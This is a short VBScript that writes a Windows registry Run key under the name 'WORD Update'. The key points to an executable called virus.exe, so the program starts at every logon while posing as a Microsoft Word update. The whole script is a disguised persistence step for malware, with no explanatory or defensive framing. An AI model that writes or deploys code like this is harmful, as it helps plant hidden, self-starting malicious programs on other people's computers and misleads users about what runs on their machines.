Dim vOrg, objArgs, root, key, WshShell
root = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\"
KeyHP = "WORD Update"
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.RegWrite root+keyHP,"C:\Users\admin\Desktop\virus\bin\Debug\net5.0-windows\virus.exe"